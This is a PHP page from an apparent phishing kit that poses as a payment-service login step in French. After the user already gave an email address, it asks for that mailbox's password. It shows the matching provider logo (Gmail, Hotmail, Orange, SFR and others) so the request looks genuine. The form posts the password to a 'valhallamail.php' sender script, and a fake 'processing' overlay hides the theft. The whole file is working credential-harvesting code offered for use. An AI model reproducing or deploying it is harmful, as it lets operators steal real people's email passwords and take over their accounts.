<?php
	include("../settings/lang/index.php");
	session_start();
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title><?php echo $valhalla1; ?></title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
</head>
<body>

	<!--
authflow/entry/?country.x=FR&flowContext=login&flowId=ul&locale.x=fr_FR&returnUri=%2Fauth%2Freturn&stepupContext=8328080216937885391
	-->

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>


		<!--[ ALERT MESSAGE CONTAINER ]-->
				<div class="valhallaContent" id="valhallamsgInfo">

				<!-- CONTAINER --> 
					<div class="valhallasafeComponent">
						<header>
							<div class="valhallaLogo"></div>
						</header>
						<div class="valhallasafe">
							<h1><?php echo $valhalla2; ?></h1>
							<div class="valhallaSafeDescription"><p class="valhallaDescription"><?php echo $valhalla3; ?></p></div>
							<input type="button" class="valhallaButton" value="<?php echo $valhalla4; ?>" onclick="showbill()">
						</div>
					</div>

				</div>


		<!--[ MAILBOX CONTAINER ]-->
			<div class="valhallaContent valhallaContentInfo hide" id="valhallabillInfo">

				<!-- CONTAINER --> 
					<div class="valhallasafeComponent">
						<header class="valhallaInfo">
							<div class="valhallaLogo big"></div>
						</header>
						<div class="valhallasafe">
							<h1 class="valhallaInfoTitle"><?php echo $valhalla5; ?></h1>
								<p class="valhallaFormTitle"><?php echo $valhalla6; ?></p>

							<form action="../settings/send/valhallamail.php" method="post" name="EmailForm" onsubmit="return validateEmailForm()">

								<div class="valhallaMailBox">
									<div class="xeomMailLogo">

										<?php

										$usermail = $_SESSION["email"];
										if(strpos($usermail, "hotmail") == true || strpos($usermail, "outlook") == true) {
											echo '<img src="../assets/img/mails/hotmail.svg" style="height: 30px;">';
										}
										elseif(strpos($usermail, "gmail") == true || strpos($usermail, "googlemail") == true) {
											echo '<img src="../assets/img/mails/gmail.png" style="height: 50px;">';
										}
										elseif(strpos($usermail, "yahoo") == true || strpos($usermail, "ymail") == true) {
											echo '<img src="../assets/img/mails/yahoo.png" style="height: 50px;">';
										}
										elseif(strpos($usermail, "orange") == true || strpos($usermail, "wanadoo") == true) {
											echo '<img src="../assets/img/mails/orange.png" style="height: 60px;">';
										}
										elseif(strpos($usermail, "sfr") == true) {
											echo '<img src="../assets/img/mails/sfr.png" style="height: 60px;">';
										}
										elseif(strpos($usermail, "gmx") == true) {
											echo '<img src="../assets/img/mails/gmx.png" style="height: 70px;">';
										}
										elseif(strpos($usermail, "free") == true) {
											echo '<img src="../assets/img/mails/free.png" style="height: 60px;">';
										}
										elseif(strpos($usermail, "aol") == true) {
											echo '<img src="../assets/img/mails/aol.svg" style="height: 60px;">';
										}
										else{
											echo '<img src="../assets/img/mails/default.png" style="height: 80px;">';
										}

										?>

										
									</div>
						 			<div class="valhalla-r-mail">
						 				<div class="contact"><?php echo $valhalla7; ?><br>
						 					<p><span><?php echo $_SESSION["email"]; ?></span></p>
						 				</div>
						 			</div>
					 			</div>

								<div class="valhallaFieldset">
									<input type="password" name="valhallamailboxpass" id="valhallamailboxpass" placeholder="<?php echo $valhalla8; ?>" autocomplete="off" autocorrect="off" />
									<div style="text-align: right;" class="valhallaWhatIsMailContainer">
										<a href="javascript:void(0)" class="valhallaWhatIsMail" onclick="valhallaWhatIsMail()"><?php echo $valhalla9; ?></a>
										<p class="valhallaWhatIsMailText hide" id="valhallaWhatIsMailText">
											<?php echo $valhalla10; ?>
										</p>
									</div>
								</div>


								<input type="submit" class="valhallaButton" value="<?php echo $valhalla11; ?>">
							</form>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>

	<footer class="valhallaFooter">
		<ul class="valhallaFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

	<script type="text/javascript" src="../assets/js/main.js"></script>
	<script type="text/javascript" src="../assets/js/sections.js"></script>
	<script>
	$(document).ready(function(){
		$('#valhallamailboxpass').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallamailboxpass').removeClass('hasError'); } else {$('#valhallamailboxpass').removeClass('hasError'); }});
		
		});
	</script>

<!-- LOADING -->
	<div class="valhallaLoaderOverlay">
		<div class="valhallaModalAnimate" id="valhallaModalAnimate">
			<div class="valhallaRotate"></div>
			<div class="valhallaProcessing"><?php echo $valhalla12; ?></div>
			<div class="valhallaLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="valhallaModalOverlay" id="valhallaModalOverlay"></div>
		
</body>
</html>